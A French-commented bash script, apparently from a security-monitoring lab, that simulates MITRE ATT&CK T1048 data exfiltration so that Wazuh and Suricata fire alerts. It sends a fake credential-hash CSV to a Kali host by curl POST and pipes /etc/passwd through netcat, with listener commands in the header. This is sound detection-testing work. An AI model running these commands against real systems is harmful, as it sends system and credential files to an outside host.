#!/bin/bash
# ──────────────────────────────────────────────────────────────────
# MITRE ATT&CK : T1048 — Exfiltration Over Alternative Protocol
# Technique    : Exfiltration de données via HTTP (curl) et netcat
# Génère       : Wazuh + Suricata (connexions sortantes anormales)
# Run depuis   : Cible (Wazuh VM)
# Usage        : bash 07_data_exfiltration.sh [KALI_IP]
#
# Prérequis côté Kali (récepteur) :
#   HTTP : python3 -m http.server 8080
#   NC   : nc -lvnp 9001 > /tmp/received.tar.gz
# ──────────────────────────────────────────────────────────────────

KALI_IP=${1:-192.168.56.103}

# Créer un faux fichier de données sensibles
EXFIL_FILE=$(mktemp /tmp/sensitive_XXXX.csv)
cat > "$EXFIL_FILE" <<'EOF'
username,password_hash,email,role
admin,$6$rounds=5000$xyz$hash1,admin@corp.local,Administrator
user1,$6$rounds=5000$abc$hash2,user1@corp.local,User
svc_backup,$6$rounds=5000$def$hash3,backup@corp.local,Service
EOF

echo "[*] Méthode 1 — Exfiltration HTTP via curl POST → $KALI_IP:8080"
curl -s -X POST "http://$KALI_IP:8080/upload" \
    -F "file=@$EXFIL_FILE" \
    --connect-timeout 5 2>/dev/null \
    && echo "[+] Envoi HTTP réussi" \
    || echo "[-] Serveur HTTP non disponible (lancer : python3 -m http.server 8080 sur Kali)"

echo ""
echo "[*] Méthode 2 — Exfiltration via netcat → $KALI_IP:9001"
tar czf - /etc/passwd /etc/hostname 2>/dev/null \
    | nc -w 3 "$KALI_IP" 9001 \
    && echo "[+] Envoi netcat réussi" \
    || echo "[-] Listener NC non disponible (lancer : nc -lvnp 9001 sur Kali)"

echo ""
echo "[!] Cleanup : rm $EXFIL_FILE"
rm -f "$EXFIL_FILE"
